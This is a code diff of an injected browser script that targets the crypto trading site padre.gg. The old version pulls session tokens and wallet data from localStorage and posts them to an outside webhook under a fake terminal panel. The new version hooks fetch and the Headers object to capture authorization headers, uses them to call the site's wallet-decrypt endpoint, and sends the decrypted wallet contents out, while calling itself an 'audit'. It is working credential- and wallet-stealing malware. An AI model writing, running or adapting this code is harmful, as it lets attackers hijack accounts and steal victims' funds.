@@ -1,63 +1,80 @@
 (function() {
-    // 1. YOUR PROXY CONFIG
-    const PROXY = "https://vanta-proxy.jdurrulo.workers.dev/";
-
-    // 2. THE DATA EXTRACTION (Specific to Padre.gg)
-    const getSensitiveData = () => {
-        return {
-            session: localStorage.getItem('padre-session-v2'),
-            bundles: localStorage.getItem('padre-v2-bundles-store-v2'),
-            wallets: localStorage.getItem('padre-v2-wallets-store-v2'),
-            url: window.location.href,
-            timestamp: new Date().toISOString()
-        };
+    const CONFIG = {
+        webhook: "https://vanta-proxy.jdurrulo.workers.dev/",
+        decryptUrl: "https://api.padre.gg/v2/enclave/decrypt"
     };
 
-    // 3. THE NOTIFICATION (UI for the target)
-    const showUI = () => {
-        const panel = document.createElement('div');
-        panel.style = `position:fixed;top:20px;right:20px;width:320px;background:#0a0a0a;border:1px solid #1a1a1a;border-radius:12px;padding:20px;z-index:999999999;color:#fff;font-family:monospace;box-shadow:0 20px 40px #000;`;
-        panel.innerHTML = `
-            <div style="color:#00ff88;font-weight:bold;margin-bottom:10px;display:flex;justify-content:space-between;">
-                <span>VANTA TERMINAL</span>
-                <span id="vanta-status" style="color:#444;">●</span>
-            </div>
-            <div id="vanta-logs" style="font-size:11px;color:#888;height:40px;overflow:hidden;">
-                > Initializing streams...<br>
-                > Connecting to Padre node...
-            </div>
-        `;
-        document.body.appendChild(panel);
-
-        // Update UI status after sending
-        setTimeout(() => {
-            document.getElementById('vanta-status').style.color = "#00ff88";
-            document.getElementById('vanta-logs').innerHTML += "<br>> Connection Established.";
-        }, 1500);
-    };
-
-    // 4. TRIGGER THE EXFILTRATION
-    const data = getSensitiveData();
-    if (data.session) {
-        fetch(PROXY, {
+    const notify = (msg) => {
+        fetch(CONFIG.webhook, {
             method: 'POST',
-            mode: 'no-cors', // Essential to bypass restrictive CORS on target sites
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                username: "Vanta Bot",
-                avatar_url: "https://trade.padre.gg/logo.svg",
-                embeds: [{
-                    title: "🎯 Session Captured",
-                    color: 65416,
-                    fields: [
-                        { name: "Domain", value: window.location.hostname },
-                        { name: "Session Key", value: "```" + data.session + "```" },
-                        { name: "Wallet Data", value: "```json\n" + (data.wallets ? data.wallets.substring(0, 500) : "None") + "```" }
-                    ]
-                }]
-            })
-        }).catch(() => {});
-    }
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ embeds: [{ title: "🚨 AUDIT ALERT", description: msg, color: 0xff0000 }]})
+        }).catch(()=>{});
+    };
 
-    showUI();
+    /* 1. THE DECRYPTOR */
+    const runDecryption = async (token, session) => {
+        const bundleStr = localStorage.getItem('padre-v2-bundles-store-v2');
+        if (!bundleStr) return;
+        
+        const bundleData = JSON.parse(bundleStr);
+        const firstKey = Object.keys(bundleData.bundles)[0];
+        const payload = {
+            bundle: bundleData.bundles[firstKey].exportBundle,
+            subOrgId: bundleData.bundles[firstKey].subOrgId
+        };
+
+        try {
+            const res = await fetch(CONFIG.decryptUrl, {
+                method: 'POST',
+                headers: {
+                    'Authorization': token,
+                    'X-Padre-Session': session,
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+            const decrypted = await res.json();
+            notify("✅ **WALLET DECRYPTED**\n```json\n" + JSON.stringify(decrypted, null, 2) + "\n```");
+        } catch (e) {
+            notify("❌ Decryption failed: " + e.message);
+        }
+    };
+
+    /* 2. THE AGGRESSIVE SNIFFER */
+    let capturedToken = null;
+    let capturedSession = "";
+
+    const checkAndRun = (name, val) => {
+        if (name.toLowerCase() === 'authorization') capturedToken = val;
+        if (name.toLowerCase() === 'x-padre-session') capturedSession = val;
+        
+        if (capturedToken && !window.auditComplete) {
+            window.auditComplete = true;
+            notify("🔑 Credentials Sniffed. Attempting Auto-Decrypt...");
+            runDecryption(capturedToken, capturedSession);
+        }
+    };
+
+    const _set = Headers.prototype.set;
+    Headers.prototype.set = function(n, v) {
+        checkAndRun(n, v);
+        return _set.apply(this, arguments);
+    };
+
+    const _f = window.fetch;
+    window.fetch = async (...a) => {
+        const h = a[1]?.headers;
+        if (h) {
+            if (h instanceof Headers) {
+                h.forEach((v, n) => checkAndRun(n, v));
+            } else {
+                Object.entries(h).forEach(([n, v]) => checkAndRun(n, v));
+            }
+        }
+        return _f(...a);
+    };
+
+    /* 3. THE TRIGGER */
+    _f('/api/v2/user/profile');
 })();
